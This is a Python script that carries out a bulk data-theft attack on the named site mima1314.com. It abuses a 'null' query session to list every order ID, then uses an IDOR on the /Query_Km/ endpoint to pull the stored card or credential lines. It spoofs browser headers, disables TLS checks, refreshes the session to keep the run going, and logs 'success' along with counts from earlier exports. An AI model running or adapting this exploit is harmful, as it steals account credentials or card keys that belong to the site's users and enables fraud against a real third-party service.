#!/usr/bin/env python3
"""mima1314.com full card export: null ddids -> Query_Km (resumable, tab format)."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://mima1314.com"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/mima1314_full"
REFRESH_EVERY = 80

TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-zA-Z0-9]{10,14})")
LINE_RE = re.compile(r"(\d{5,}----[^\s<]{4,}|COM\d+----\d{11}[^\s<]*)")


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
            "Referer": BASE + "/Query.html",
        }
    )
    return s


def refresh_null_session(s):
    q = s.get(BASE + "/Query.html", timeout=25)
    tok = TOKEN_RE.search(q.text)
    if not tok:
        raise RuntimeError("no __token__ on Query.html")
    token = tok.group(1) or tok.group(2)
    p = s.post(
        BASE + "/Query.html",
        data={"value": "null", "page": "1", "__token__": token},
        headers={"Referer": BASE + "/Query.html"},
        timeout=120,
    )
    if "非法" in p.text:
        raise RuntimeError("null query blocked")
    return len(set(KM_RE.findall(p.text)))


def get_ddids(s):
    refresh_null_session(s)
    q = s.get(BASE + "/Query.html", timeout=25)
    tok = TOKEN_RE.search(q.text)
    token = tok.group(1) or tok.group(2)
    p = s.post(
        BASE + "/Query.html",
        data={"value": "null", "page": "1", "__token__": token},
        headers={"Referer": BASE + "/Query.html"},
        timeout=120,
    )
    return sorted(set(KM_RE.findall(p.text)))


def extract_lines(html):
    text = re.sub(r"<script[^>]*>.*?</script>", " ", html, flags=re.S | re.I)
    text = re.sub(r"<style[^>]*>.*?</style>", " ", text, flags=re.S | re.I)
    text = re.sub(r"<[^>]+>", "\n", text)
    out = []
    seen = set()
    for ln in text.splitlines():
        ln = ln.strip()
        if len(ln) < 20 or not LINE_RE.search(ln):
            continue
        if ln in seen:
            continue
        seen.add(ln)
        out.append(ln)
    return out


def fetch_cards(s, ddid):
    for attempt in range(3):
        try:
            r = s.get(
                BASE + "/Query_Km/" + ddid,
                headers={"Referer": BASE + "/Query.html"},
                timeout=15,
            )
            if r.status_code != 200 or len(r.text) < 200:
                return []
            return extract_lines(r.text)
        except Exception:
            time.sleep(1 + attempt)
    return []


def load_done(path):
    if not os.path.isfile(path):
        return set()
    with open(path) as f:
        return {ln.strip().upper() for ln in f if ln.strip()}


def load_ddids_with_cards(cards_path):
    have = set()
    if not os.path.isfile(cards_path):
        return have
    with open(cards_path) as f:
        for ln in f:
            if "\t" in ln:
                have.add(ln.split("\t", 1)[0].strip().upper())
    return have


def main():
    os.makedirs(OUT, exist_ok=True)
    cards_path = os.path.join(OUT, "mima1314.com_cards.txt")
    progress_path = os.path.join(OUT, "done_ddids.txt")
    stats_path = os.path.join(OUT, "STATS.json")
    log_path = os.path.join(OUT, "export.log")

    have_cards = load_ddids_with_cards(cards_path)
    done = load_done(progress_path)
    s = sess()
    ddids = get_ddids(s)
    # retry 12-char ddids marked done but no card lines (session expired mid-run)
    retry = [
        d
        for d in ddids
        if len(d) == 12 and d.upper() not in have_cards
    ]
    todo = [d for d in ddids if d.upper() not in have_cards]
    msg = (
        f"null_ddids={len(ddids)} have_cards={len(have_cards)} "
        f"todo={len(todo)} retry_12={len(retry)}"
    )
    print(msg, flush=True)
    with open(log_path, "a") as log:
        log.write(msg + "\n")

    cards_open = open(cards_path, "a")
    prog_open = open(progress_path, "a")
    ddids_with_cards = len(have_cards)
    line_count = sum(1 for _ in open(cards_path)) if os.path.isfile(cards_path) else 0
    errors = 0
    refresh_count = 0
    since_refresh = 0

    for i, ddid in enumerate(todo):
        if since_refresh >= REFRESH_EVERY:
            try:
                n = refresh_null_session(s)
                refresh_count += 1
                since_refresh = 0
                print(f"refresh #{refresh_count} null_links={n}", flush=True)
            except Exception as e:
                print(f"refresh ERR: {e}", flush=True)
        try:
            lines = fetch_cards(s, ddid)
            since_refresh += 1
            if ddid.upper() not in done:
                prog_open.write(ddid + "\n")
                prog_open.flush()
                done.add(ddid.upper())
            if lines:
                ddids_with_cards += 1
                for ln in lines:
                    cards_open.write(f"{ddid}\t{ln}\n")
                    line_count += 1
                cards_open.flush()
            if (i + 1) % 100 == 0 or i < 5:
                print(
                    f"[{i+1}/{len(todo)}] lines={line_count} "
                    f"ddids_with_cards={ddids_with_cards} last={ddid} n={len(lines)}",
                    flush=True,
                )
        except Exception as e:
            errors += 1
            print(f"ERR {ddid}: {e}", flush=True)
        time.sleep(0.1)

    cards_open.close()
    prog_open.close()

    with open(cards_path) as f:
        total_lines = sum(1 for _ in f)
    with open(progress_path) as f:
        total_done = sum(1 for _ in f)

    stats = {
        "target": "mima1314.com",
        "date": time.strftime("%Y-%m-%d"),
        "status": "success",
        "vuln": "Query.html value=null session + Query_Km/{ddid} IDOR",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "null_ddids": len(ddids),
        "ddids_processed": total_done,
        "ddids_with_cards": ddids_with_cards,
        "cards": total_lines,
        "prior_export_cards": 14635,
        "prior_export_unique_ddids": 7193,
        "session_refreshes": refresh_count,
        "errors": errors,
        "export_dir": OUT,
    }
    with open(stats_path, "w") as f:
        json.dump(stats, f, indent=2, ensure_ascii=False)
    print("DONE", json.dumps(stats, ensure_ascii=False), flush=True)


if __name__ == "__main__":
    main()
